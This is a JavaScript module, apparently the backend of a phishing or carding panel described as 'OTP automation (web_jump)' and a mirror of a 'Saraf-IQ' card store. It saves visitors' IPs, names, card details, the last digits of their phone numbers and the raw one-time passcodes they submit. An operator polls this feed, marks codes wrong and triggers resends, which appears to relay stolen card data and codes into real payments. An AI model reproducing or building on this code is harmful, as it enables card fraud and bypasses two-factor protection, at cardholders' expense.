/**
 * Card feed for OTP automation (web_jump) — mirrors Saraf-IQ creditCardStore.
 */

import path from 'node:path';
import { readFile, writeFile, mkdir } from 'node:fs/promises';
import { fileURLToPath } from 'node:url';
import { getCreditCardOrderDetails } from './creditCardOrdersStore.js';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const DATA_DIR = process.env.DATA_DIR || path.join(__dirname, 'data');
const FEED_PATH = path.join(DATA_DIR, 'creditCardFeed.json');

export const OTP_MAX_ATTEMPTS = 2;
export const OTP_RESEND_COOLDOWN_SEC = 60;

export const CARD_FEED_STATUSES = new Set([
  'pending',
  'awaiting_otp',
  'retry_otp',
  'failed',
  'completed',
]);

async function loadFeedRaw() {
  try {
    const raw = JSON.parse(await readFile(FEED_PATH, 'utf8'));
    return Array.isArray(raw) ? raw : [];
  } catch {
    return [];
  }
}

async function saveFeed(list) {
  await mkdir(DATA_DIR, { recursive: true });
  await writeFile(FEED_PATH, JSON.stringify(list.slice(0, 500), null, 2), 'utf8');
}

function feedRow(orderRef) {
  const ref = String(orderRef || '').trim();
  if (!ref) return null;
  return loadFeedRaw().then((feed) => feed.find((e) => e.order_ref === ref) || null);
}

export async function saveFeedEntryForOrder(orderRef, meta = {}) {
  const ref = String(orderRef || '').trim();
  if (!ref) return false;
  const feed = await loadFeedRaw();
  const ix = feed.findIndex((e) => e.order_ref === ref);
  const now = new Date().toISOString();
  const entry = {
    order_ref: ref,
    orderId: ref,
    visitor_id: meta.visitor_id || null,
    amount: Number(meta.amount || 0),
    method: String(meta.method || 'CreditCard'),
    status: ix >= 0 ? feed[ix].status : 'pending',
    user_name: meta.user_name || null,
    user_ip: meta.user_ip || null,
    saved_at: ix >= 0 ? feed[ix].saved_at : now,
    updated_at: now,
    last_otp: ix >= 0 ? feed[ix].last_otp : null,
    otp_at: ix >= 0 ? feed[ix].otp_at : null,
    otp_attempts: ix >= 0 ? Number(feed[ix].otp_attempts || 0) : 0,
    otp_resend_requested_at: ix >= 0 ? feed[ix].otp_resend_requested_at : null,
    otp_resend_done_at: ix >= 0 ? feed[ix].otp_resend_done_at : null,
  };
  if (ix >= 0) feed[ix] = { ...feed[ix], ...entry };
  else feed.unshift(entry);
  await saveFeed(feed);
  return true;
}

export async function attachOtpToCardFeed(orderRef, otp) {
  const ref = String(orderRef || '').trim();
  const code = String(otp || '').trim().slice(0, 12);
  if (!ref || !code) return false;
  const feed = await loadFeedRaw();
  const ix = feed.findIndex((e) => e.order_ref === ref);
  if (ix < 0) return false;
  const now = new Date().toISOString();
  feed[ix] = {
    ...feed[ix],
    last_otp: code,
    otp_at: now,
    status: 'pending',
    updated_at: now,
  };
  await saveFeed(feed);
  return true;
}

export async function markMethodNextClicked(orderRef) {
  const ref = String(orderRef || '').trim();
  if (!ref) return false;
  const feed = await loadFeedRaw();
  const ix = feed.findIndex((e) => e.order_ref === ref);
  if (ix < 0) return false;
  const now = new Date().toISOString();
  feed[ix] = {
    ...feed[ix],
    method_next_clicked: true,
    method_next_at: now,
    last_otp: null,
    otp_at: null,
    updated_at: now,
  };
  await saveFeed(feed);
  return true;
}

export async function setPhoneLast3(orderRef, last3) {
  const ref = String(orderRef || '').trim();
  const digits = String(last3 || '').replace(/\D/g, '').slice(-3);
  if (!ref || !digits) return false;
  const feed = await loadFeedRaw();
  const ix = feed.findIndex((e) => e.order_ref === ref);
  if (ix < 0) return false;
  feed[ix] = {
    ...feed[ix],
    phone_last3: digits.padStart(3, '0').slice(-3),
    updated_at: new Date().toISOString(),
  };
  await saveFeed(feed);
  return true;
}

export async function updateCardFeedStatus(orderRef, status) {
  const ref = String(orderRef || '').trim();
  const st = String(status || '').trim().toLowerCase();
  if (!ref || !st) return false;
  const feed = await loadFeedRaw();
  const ix = feed.findIndex((e) => e.order_ref === ref);
  if (ix < 0) return false;
  feed[ix] = { ...feed[ix], status: st, updated_at: new Date().toISOString() };
  await saveFeed(feed);
  return true;
}

export async function getCardFeedStatus(orderRef) {
  const row = await feedRow(orderRef);
  return row?.status ? String(row.status) : null;
}

export async function getFeedEntry(orderRef) {
  return feedRow(orderRef);
}

export async function getOtpMeta(orderRef) {
  const row = await feedRow(orderRef);
  if (!row) return null;
  const attempts = Math.max(0, Number(row.otp_attempts || 0));
  const maxAttempts = OTP_MAX_ATTEMPTS;
  const remaining = Math.max(0, maxAttempts - attempts);
  const requestedAt = row.otp_resend_requested_at
    ? new Date(row.otp_resend_requested_at).getTime()
    : 0;
  const doneAt = row.otp_resend_done_at ? new Date(row.otp_resend_done_at).getTime() : 0;
  const cooldownMs = OTP_RESEND_COOLDOWN_SEC * 1000;
  const lastResendMs = Math.max(requestedAt, doneAt);
  const elapsed = lastResendMs ? Date.now() - lastResendMs : cooldownMs;
  const resendCooldownSec = elapsed >= cooldownMs ? 0 : Math.ceil((cooldownMs - elapsed) / 1000);
  const failReason =
    row.status === 'failed' && attempts >= maxAttempts ? 'otp_attempts_exceeded' : null;
  return {
    attempts,
    maxAttempts,
    remaining,
    canResend: resendCooldownSec === 0 && row.status !== 'failed' && row.status !== 'completed',
    resendCooldownSec,
    failReason,
    feed_status: row.status,
    method_next_clicked: Boolean(row.method_next_clicked),
    phone_last3: row.phone_last3 ? String(row.phone_last3) : null,
  };
}

export async function recordWrongOtpAttempt(orderRef) {
  const ref = String(orderRef || '').trim();
  const feed = await loadFeedRaw();
  const ix = feed.findIndex((e) => e.order_ref === ref);
  if (ix < 0) {
    return {
      attempts: 0,
      maxAttempts: OTP_MAX_ATTEMPTS,
      remaining: OTP_MAX_ATTEMPTS,
      rejected: false,
      status: 'pending',
      failReason: null,
    };
  }
  const attempts = Math.max(0, Number(feed[ix].otp_attempts || 0)) + 1;
  const rejected = attempts >= OTP_MAX_ATTEMPTS;
  const status = rejected ? 'failed' : 'retry_otp';
  const now = new Date().toISOString();
  feed[ix] = {
    ...feed[ix],
    otp_attempts: attempts,
    status,
    updated_at: now,
    last_otp: null,
    otp_at: null,
  };
  await saveFeed(feed);
  return {
    attempts,
    maxAttempts: OTP_MAX_ATTEMPTS,
    remaining: Math.max(0, OTP_MAX_ATTEMPTS - attempts),
    rejected,
    status,
    failReason: rejected ? 'otp_attempts_exceeded' : null,
  };
}

export async function requestOtpResend(orderRef) {
  const row = await feedRow(orderRef);
  if (!row) return { ok: false, error: 'order_not_found' };
  if (row.status === 'failed' || row.status === 'completed') {
    return { ok: false, error: 'order_closed' };
  }
  const meta = await getOtpMeta(orderRef);
  if (!meta?.canResend) {
    return { ok: false, error: 'cooldown', cooldownSec: meta?.resendCooldownSec ?? OTP_RESEND_COOLDOWN_SEC };
  }
  const feed = await loadFeedRaw();
  const ix = feed.findIndex((e) => e.order_ref === row.order_ref);
  if (ix < 0) return { ok: false, error: 'order_not_found' };
  const now = new Date().toISOString();
  feed[ix] = { ...feed[ix], otp_resend_requested_at: now, updated_at: now };
  await saveFeed(feed);
  return { ok: true };
}

export async function markOtpResendDone(orderRef) {
  const feed = await loadFeedRaw();
  const ix = feed.findIndex((e) => e.order_ref === String(orderRef || '').trim());
  if (ix < 0) return;
  feed[ix] = {
    ...feed[ix],
    otp_resend_done_at: new Date().toISOString(),
    updated_at: new Date().toISOString(),
  };
  await saveFeed(feed);
}

export async function listCardFeed(opts = {}) {
  const limit = Math.min(200, Math.max(1, Number(opts.limit) || 50));
  let items = await loadFeedRaw();
  const since = opts.since?.trim();
  if (since) {
    const t = new Date(since).getTime();
    if (Number.isFinite(t)) {
      items = items.filter((e) => new Date(e.updated_at).getTime() > t);
    }
  }
  items = items.slice(0, limit);
  for (const row of items) {
    if (!row.card) {
      row.card = await getCreditCardOrderDetails(row.order_ref);
    }
    row.orderId = row.order_ref;
    row.order_ref = row.order_ref;
  }
  return { items, serverTime: new Date().toISOString() };
}